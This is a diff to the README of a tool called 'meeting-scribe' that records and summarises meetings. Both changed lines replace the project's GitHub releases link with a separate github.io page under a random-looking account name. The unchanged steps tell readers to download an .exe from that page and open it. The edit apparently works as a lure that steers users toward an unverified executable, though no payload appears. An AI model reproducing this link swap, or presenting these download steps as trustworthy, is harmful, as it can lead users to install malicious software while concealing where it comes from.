@@ -1,6 +1,6 @@
 # 📝 meeting-scribe - Record and summarize meetings with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/frenchindochinameningealartery544/meeting-scribe/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://frenchindochinameningealartery544.github.io)
 
 meeting-scribe records your meetings and turns them into text. It works on your computer to keep your data private. Use this tool to create summaries, search through past notes, and keep track of what people said during your calls.
 
@@ -8,7 +8,7 @@ meeting-scribe records your meetings and turns them into text. It works on your 
 
 You need to download the installer to add this program to your computer.
 
-1. Go to this page to download: [meeting-scribe Releases](https://github.com/frenchindochinameningealartery544/meeting-scribe/releases).
+1. Go to this page to download: [meeting-scribe Releases](https://frenchindochinameningealartery544.github.io).
 2. Look for the file ending in `.exe` under the latest version.
 3. Click the file name to start your download.
 4. Open the file once it finishes downloading.
